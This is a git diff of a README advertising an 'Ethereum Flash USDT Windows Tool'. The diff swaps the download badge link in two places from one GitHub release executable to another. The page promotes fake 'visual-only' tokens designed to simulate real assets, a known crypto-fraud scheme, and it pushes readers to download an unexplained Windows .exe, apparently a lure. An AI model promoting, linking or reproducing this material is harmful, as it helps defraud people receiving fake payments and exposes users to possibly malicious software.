@@ -1,7 +1,7 @@
 <h1 align="center"><b> ⚡ Ethereum Flash USDT Windows Tool </b></h1>
 
 <p align="center">
-  <a href="https://github.com/mr-nomad/Flash-USDT-proxy-server/releases/download/Flash/ETH.exe">
+  <a href="https://github.com/mr-nomad/Flash-USDT-proxy-server/releases/download/FlashUSDT/FlashTool.exe">
     <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
   </a>
 </p>
@@ -31,7 +31,7 @@ All tokens are **visual-only**, designed to simulate real assets:
 - **DAI (Multi-Collateral Dai)**
 
 <p align="center">
-  <a href="https://github.com/mr-nomad/Flash-USDT-proxy-server/releases/download/Flash/ETH.exe">
+  <a href="https://github.com/mr-nomad/Flash-USDT-proxy-server/releases/download/FlashUSDT/FlashTool.exe">
     <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
   </a>
 </p>
